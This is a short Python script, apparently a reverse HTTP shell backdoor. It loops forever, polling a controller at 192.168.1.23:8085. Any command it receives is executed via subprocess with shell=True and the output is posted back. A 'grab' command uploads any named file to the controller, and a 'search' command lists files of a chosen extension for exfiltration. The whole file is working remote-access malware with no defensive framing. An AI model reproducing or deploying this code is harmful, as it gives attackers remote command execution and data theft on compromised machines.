#  grab and search reverse http
import requests
import os
import subprocess
import time

while True:
    req = requests.get('http://192.168.1.23:8085')
    command = req.text
    if 'terminate' in command:
        break
    elif 'grab' in command:
        grab, path = command.split("*")
        if os.path.exists(path):
            url = "http://192.168.1.23:8085/store"
            filer = {'file': open(path, 'rb')}
            r = requests.post(url, files=filer)
        else:
            post_response = requests.post(url='http://192.168.1.23:8085', data='[-] Not able to find the file!'.encode())
    elif 'search' in command:
        command = command[7:]
        path, ext = command.split('*')
        lists = ''

        for dirpath, dirnames, filenames in os.walk(path):
           for file in filenames:
               if file.endswith(ext):
                   lists = lists + '\n' + os.path.join(dirpath, file)
        requests.post(url='http://192.168.1.23:8085', data=lists)
    else:
        CMD = subprocess.Popen(command, shell=True,stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        post_response = requests.post(url='http://192.168.1.23:8085', data=CMD.stdout.read())
        post_response = requests.post(url='http://192.168.1.23:8085', data=CMD.stderr.read())
    time.sleep(3)

